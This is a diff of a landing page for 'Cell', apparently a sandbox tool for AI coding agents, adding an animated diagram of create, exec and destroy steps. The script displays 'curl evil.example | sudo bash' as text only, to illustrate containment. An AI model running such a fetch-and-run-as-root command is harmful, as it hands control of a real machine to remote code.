@@ -20,6 +20,9 @@
       --mute: #5a6b62;
       --line: rgba(14, 20, 18, 0.12);
       --glow: rgba(196, 240, 66, 0.18);
+      --danger: #e85d4c;
+      --host-ok: #3dba7a;
+      --stage: 12s;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html { scroll-behavior: smooth; }
@@ -34,7 +37,7 @@
     }
     a { color: var(--moss-deep); text-underline-offset: 3px; }
     .shell {
-      max-width: 1080px;
+      max-width: 1120px;
       margin: 0 auto;
       padding: 1.25rem 1.5rem 4rem;
     }
@@ -43,7 +46,7 @@
       align-items: center;
       justify-content: flex-end;
       gap: 1rem;
-      margin-bottom: 2rem;
+      margin-bottom: 1.5rem;
       animation: rise 0.7s ease both;
     }
     .top nav {
@@ -56,21 +59,20 @@
     .hero {
       display: grid;
       gap: 2rem;
-      align-items: start;
-      padding: 0.5rem 0 2.5rem;
+      align-items: center;
+      padding: 0.25rem 0 2rem;
       animation: rise 0.85s 0.08s ease both;
     }
-    @media (min-width: 860px) {
+    @media (min-width: 900px) {
       .hero {
-        grid-template-columns: 1.15fr 0.85fr;
-        gap: 3rem;
-        align-items: center;
+        grid-template-columns: 0.95fr 1.2fr;
+        gap: 2.5rem;
       }
     }
     .brand {
       font-family: "IBM Plex Mono", ui-monospace, monospace;
       font-weight: 500;
-      font-size: clamp(3.2rem, 9vw, 6.5rem);
+      font-size: clamp(3.2rem, 9vw, 6.2rem);
       letter-spacing: -0.06em;
       line-height: 0.92;
       color: var(--moss-deep);
@@ -81,8 +83,8 @@
       animation: tick 2.8s ease-in-out infinite;
     }
     h1 {
-      margin-top: 1.25rem;
-      font-size: clamp(1.35rem, 2.6vw, 1.85rem);
+      margin-top: 1.1rem;
+      font-size: clamp(1.3rem, 2.5vw, 1.75rem);
       font-weight: 600;
       letter-spacing: -0.02em;
       max-width: 18ch;
@@ -97,7 +99,7 @@
       display: flex;
       flex-wrap: wrap;
       gap: 0.75rem;
-      margin-top: 1.75rem;
+      margin-top: 1.6rem;
     }
     .btn {
       display: inline-flex;
@@ -120,21 +122,222 @@
       color: var(--ink);
       border: 1px solid var(--line);
     }
-    .panel {
+
+    /* —— Isolation demo —— */
+    .demo {
+      position: relative;
       background: var(--ink);
       color: #c9d6ce;
-      border-radius: 0.5rem;
-      padding: 1.1rem 1.15rem 1.2rem;
+      border-radius: 0.65rem;
+      padding: 1rem 1rem 1.15rem;
+      box-shadow: 0 24px 50px rgba(14, 20, 18, 0.22);
+      overflow: hidden;
+      min-height: 340px;
+    }
+    .demo::before {
+      content: "";
+      position: absolute;
+      inset: -40% -20% auto auto;
+      width: 70%;
+      height: 80%;
+      background: radial-gradient(circle, rgba(196, 240, 66, 0.12), transparent 65%);
+      pointer-events: none;
+      animation: glowPulse var(--stage) ease-in-out infinite;
+    }
+    .demo-caption {
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      gap: 0.75rem;
+      margin-bottom: 0.85rem;
+      position: relative;
+      z-index: 1;
+    }
+    .demo-caption .label {
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.72rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      color: #7a8f84;
+    }
+    .demo-step {
       font-family: "IBM Plex Mono", ui-monospace, monospace;
       font-size: 0.78rem;
-      line-height: 1.65;
-      box-shadow: 0 24px 50px rgba(14, 20, 18, 0.22);
-      animation: float 5.5s ease-in-out infinite;
+      color: var(--signal);
+      min-height: 1.2em;
     }
-    .panel .prompt { color: var(--signal); }
-    .panel .dim { color: #6d7f75; }
+    .scene {
+      position: relative;
+      z-index: 1;
+      display: grid;
+      grid-template-columns: 1fr 1.4fr;
+      gap: 0.75rem;
+      min-height: 260px;
+    }
+    @media (max-width: 560px) {
+      .scene { grid-template-columns: 1fr; }
+      .demo { min-height: 0; }
+    }
+    .lane {
+      display: flex;
+      flex-direction: column;
+      gap: 0.65rem;
+      justify-content: center;
+    }
+    .node {
+      border: 1px solid rgba(201, 214, 206, 0.16);
+      border-radius: 0.4rem;
+      padding: 0.55rem 0.7rem;
+      background: rgba(255, 255, 255, 0.03);
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.72rem;
+    }
+    .node strong {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #e7f0ea;
+      margin-bottom: 0.15rem;
+    }
+    .node .meta { color: #6d7f75; }
+    .agent.active {
+      animation: nodeFlash 0.6s ease;
+      border-color: rgba(196, 240, 66, 0.55);
+      box-shadow: 0 0 0 1px rgba(196, 240, 66, 0.2);
+    }
+    .control.active {
+      animation: nodeFlash 0.6s ease;
+      border-color: rgba(196, 240, 66, 0.55);
+    }
+    .arrow-flow {
+      height: 28px;
+      position: relative;
+      margin: 0.1rem 0;
+    }
+    .arrow-flow svg { width: 100%; height: 100%; overflow: visible; }
+    .arrow-flow .pulse {
+      fill: var(--signal);
+      opacity: 0;
+    }
+    .hosts {
+      display: flex;
+      flex-direction: column;
+      gap: 0.55rem;
+      justify-content: center;
+    }
+    .host {
+      position: relative;
+      border: 1px solid rgba(61, 186, 122, 0.35);
+      border-radius: 0.45rem;
+      padding: 0.55rem 0.65rem 0.65rem;
+      background: rgba(61, 186, 122, 0.06);
+      min-height: 72px;
+      transition: box-shadow 0.3s ease;
+    }
+    .host.ok {
+      box-shadow: inset 0 0 0 1px rgba(61, 186, 122, 0.15);
+    }
+    .host-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.7rem;
+      margin-bottom: 0.35rem;
+    }
+    .host-top .name { color: #d5e5db; }
+    .pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      color: var(--host-ok);
+      font-size: 0.65rem;
+      letter-spacing: 0.03em;
+    }
+    .pill i {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--host-ok);
+      box-shadow: 0 0 8px rgba(61, 186, 122, 0.8);
+      animation: breath 2.2s ease-in-out infinite;
+    }
+    .cache {
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.62rem;
+      color: #7a8f84;
+      margin-top: 0.15rem;
+    }
+    .cache.warm {
+      color: var(--signal);
+      animation: cacheWarm 0.8s ease;
+    }
+    .cell {
+      position: absolute;
+      left: 0.55rem;
+      right: 0.55rem;
+      bottom: 0.45rem;
+      top: 1.55rem;
+      border-radius: 0.3rem;
+      background: #15201b;
+      border: 1px solid rgba(232, 93, 76, 0.35);
+      padding: 0.35rem 0.45rem;
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.62rem;
+      line-height: 1.35;
+      opacity: 0;
+      transform: scale(0.92) translateY(6px);
+      pointer-events: none;
+      overflow: hidden;
+    }
+    .cell.show {
+      opacity: 1;
+      transform: none;
+      transition: opacity 0.35s ease, transform 0.35s ease;
+    }
+    .cell.danger {
+      border-color: rgba(232, 93, 76, 0.75);
+      box-shadow: 0 0 18px rgba(232, 93, 76, 0.18);
+      animation: dangerPulse 0.9s ease;
+    }
+    .cell.destroy {
+      opacity: 0;
+      transform: scale(0.85);
+      filter: blur(2px);
+      transition: opacity 0.45s ease, transform 0.45s ease, filter 0.45s ease;
+    }
+    .cell .tag {
+      color: var(--danger);
+      margin-bottom: 0.15rem;
+    }
+    .cell .cmd { color: #f0c4be; }
+    .cell .dim { color: #6d7f75; }
+    .legend {
+      margin-top: 0.75rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem 1.1rem;
+      font-family: "IBM Plex Mono", ui-monospace, monospace;
+      font-size: 0.65rem;
+      color: #6d7f75;
+      position: relative;
+      z-index: 1;
+    }
+    .legend span::before {
+      content: "";
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 2px;
+      margin-right: 0.35rem;
+      vertical-align: middle;
+    }
+    .legend .l-host::before { background: var(--host-ok); }
+    .legend .l-cell::before { background: var(--danger); }
+    .legend .l-cache::before { background: var(--signal); }
+
     .section {
-      margin-top: 5rem;
+      margin-top: 4.5rem;
       padding-top: 2.5rem;
       border-top: 1px solid var(--line);
       animation: rise 0.8s 0.15s ease both;
@@ -178,13 +381,33 @@
       from { opacity: 0; transform: translateY(14px); }
       to { opacity: 1; transform: none; }
     }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
-    }
     @keyframes tick {
       0%, 100% { transform: translateY(0); }
       40% { transform: translateY(-4px); }
+    }
+    @keyframes breath {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.55; transform: scale(0.85); }
+    }
+    @keyframes nodeFlash {
+      0% { background: rgba(196, 240, 66, 0.08); }
+      100% { background: rgba(255, 255, 255, 0.03); }
+    }
+    @keyframes cacheWarm {
+      0% { color: #7a8f84; }
+      40% { color: var(--signal); letter-spacing: 0.04em; }
+      100% { color: var(--signal); }
+    }
+    @keyframes dangerPulse {
+      0%, 100% { box-shadow: 0 0 12px rgba(232, 93, 76, 0.12); }
+      50% { box-shadow: 0 0 22px rgba(232, 93, 76, 0.35); }
+    }
+    @keyframes glowPulse {
+      0%, 100% { opacity: 0.55; }
+      50% { opacity: 1; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .brand span, .pill i, .demo::before { animation: none; }
     }
   </style>
 </head>
@@ -203,20 +426,73 @@
         <div class="brand" aria-label="Cell">Cell<span>_</span></div>
         <h1>Ephemeral environments for AI coding agents</h1>
         <p class="lede">
-          Create → exec → destroy. Durable caches survive. Isolation fails closed.
+          Create → exec → destroy. Durable caches survive. Hosts stay green.
         </p>
         <div class="cta">
           <a class="btn btn-primary" href="https://github.com/YanChao1999/Cell">View repository</a>
           <a class="btn btn-ghost" href="https://github.com/YanChao1999/Cell/blob/main/README.md">Read the README</a>
         </div>
       </div>
-      <pre class="panel" aria-hidden="true"><span class="dim"># agent loop</span>
-<span class="prompt">$</span> cell create --env go-1.23
-<span class="dim">cell_id=… worker=worker-a</span>
-<span class="prompt">$</span> cell exec go test ./...
-<span class="dim">exit 0</span>
-<span class="prompt">$</span> cell destroy
-<span class="dim">caches warm · workspace gone</span></pre>
+
+      <div class="demo" id="demo" aria-label="Animated diagram: agent creates a Cell, runs a dangerous command, destroys it; hosts stay healthy">
+        <div class="demo-caption">
+          <span class="label">Distributed isolation</span>
+          <span class="demo-step" id="demoStep">idle</span>
+        </div>
+        <div class="scene">
+          <div class="lane">
+            <div class="node agent" id="nodeAgent">
+              <strong>Agent</strong>
+              <span class="meta">calls create / exec / destroy</span>
+            </div>
+            <div class="arrow-flow" aria-hidden="true">
+              <svg viewBox="0 0 120 28" preserveAspectRatio="none">
+                <path d="M8 14 H112" stroke="rgba(201,214,206,0.25)" stroke-width="1.5" fill="none" />
+                <polygon points="112,14 104,10 104,18" fill="rgba(201,214,206,0.35)" />
+                <circle class="pulse" id="pulse1" r="3.5" cx="8" cy="14" />
+              </svg>
+            </div>
+            <div class="node control" id="nodeControl">
+              <strong>Controller</strong>
+              <span class="meta">schedule · auth · cache hints</span>
+            </div>
+            <div class="arrow-flow" aria-hidden="true">
+              <svg viewBox="0 0 120 28" preserveAspectRatio="none">
+                <path d="M8 14 H112" stroke="rgba(201,214,206,0.25)" stroke-width="1.5" fill="none" />
+                <polygon points="112,14 104,10 104,18" fill="rgba(201,214,206,0.35)" />
+                <circle class="pulse" id="pulse2" r="3.5" cx="8" cy="14" />
+              </svg>
+            </div>
+          </div>
+
+          <div class="hosts">
+            <div class="host ok" id="hostA">
+              <div class="host-top">
+                <span class="name">worker-a</span>
+                <span class="pill"><i></i> green</span>
+              </div>
+              <div class="cache" id="cacheA">cache · cold</div>
+              <div class="cell" id="cellA">
+                <div class="tag">cell · ephemeral</div>
+                <div class="cmd" id="cellCmd">$ …</div>
+                <div class="dim" id="cellDim"> </div>
+              </div>
+            </div>
+            <div class="host ok" id="hostB">
+              <div class="host-top">
+                <span class="name">worker-b</span>
+                <span class="pill"><i></i> green</span>
+              </div>
+              <div class="cache" id="cacheB">cache · warm (go-mod)</div>
+            </div>
+          </div>
+        </div>
+        <div class="legend">
+          <span class="l-host">hosts stay healthy</span>
+          <span class="l-cell">blast radius = one Cell</span>
+          <span class="l-cache">cache reused across creates</span>
+        </div>
+      </div>
     </section>
 
     <section class="section">
@@ -248,5 +524,106 @@
       <span><a href="https://github.com/YanChao1999/Cell">github.com/YanChao1999/Cell</a></span>
     </footer>
   </div>
+
+  <script>
+    (function () {
+      const reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+      const stepEl = document.getElementById("demoStep");
+      const agent = document.getElementById("nodeAgent");
+      const control = document.getElementById("nodeControl");
+      const cell = document.getElementById("cellA");
+      const cellCmd = document.getElementById("cellCmd");
+      const cellDim = document.getElementById("cellDim");
+      const cacheA = document.getElementById("cacheA");
+      const cacheB = document.getElementById("cacheB");
+      const pulse1 = document.getElementById("pulse1");
+      const pulse2 = document.getElementById("pulse2");
+
+      const dangerCmd = "curl evil.example | sudo bash";
+      const steps = [
+        { t: 0,    text: "1 · agent → create", run() {
+            resetCell();
+            flash(agent); shoot(pulse1);
+            cacheA.textContent = "cache · cold";
+            cacheA.classList.remove("warm");
+            cacheB.classList.add("warm");
+            cacheB.textContent = "cache · warm (go-mod)";
+          }},
+        { t: 1600, text: "2 · controller places Cell (reuse cache)", run() {
+            flash(control); shoot(pulse2);
+            cacheA.textContent = "cache · pull warm keys";
+            cacheA.classList.add("warm");
+            cell.classList.remove("destroy", "danger");
+            cell.classList.add("show");
+            cellCmd.textContent = "$ ready · workspace mounted";
+            cellDim.textContent = "worker-a · caches seeded";
+          }},
+        { t: 3800, text: "3 · exec a hostile command", run() {
+            cell.classList.add("danger");
+            cellCmd.textContent = "$ " + dangerCmd;
+            cellDim.textContent = "confined to this Cell";
+            flash(agent);
+          }},
+        { t: 6200, text: "4 · destroy Cell", run() {
+            cell.classList.add("destroy");
+            cellDim.textContent = "workspace gone";
+            flash(control);
+          }},
+        { t: 8200, text: "5 · hosts still green", run() {
+            cell.classList.remove("show", "danger", "destroy");
+            cacheA.textContent = "cache · warm (survived)";
+            cacheA.classList.add("warm");
+            cellCmd.textContent = "$ …";
+            cellDim.textContent = " ";
+          }},
+        { t: 10000, text: "loop · next agent call", run() {} },
+      ];
+
+      function flash(el) {
+        el.classList.remove("active");
+        void el.offsetWidth;
+        el.classList.add("active");
+      }
+      function shoot(dot) {
+        if (!dot) return;
+        dot.style.opacity = "1";
+        dot.animate(
+          [
+            { cx: 8, opacity: 1 },
+            { cx: 108, opacity: 0.2 },
+          ],
+          { duration: 700, easing: "ease-out" }
+        );
+        setTimeout(function () { dot.style.opacity = "0"; }, 720);
+      }
+      function resetCell() {
+        cell.classList.remove("show", "danger", "destroy");
+      }
+
+      if (reduce) {
+        stepEl.textContent = "create → hostile exec → destroy · hosts green";
+        cell.classList.add("show");
+        cellCmd.textContent = "$ " + dangerCmd;
+        cellDim.textContent = "blast radius = Cell only";
+        cacheA.textContent = "cache · warm (reused)";
+        cacheA.classList.add("warm");
+        return;
+      }
+
+      let timers = [];
+      function cycle() {
+        timers.forEach(clearTimeout);
+        timers = [];
+        steps.forEach(function (s) {
+          timers.push(setTimeout(function () {
+            stepEl.textContent = s.text;
+            s.run();
+          }, s.t));
+        });
+        timers.push(setTimeout(cycle, 12000));
+      }
+      cycle();
+    })();
+  </script>
 </body>
 </html>
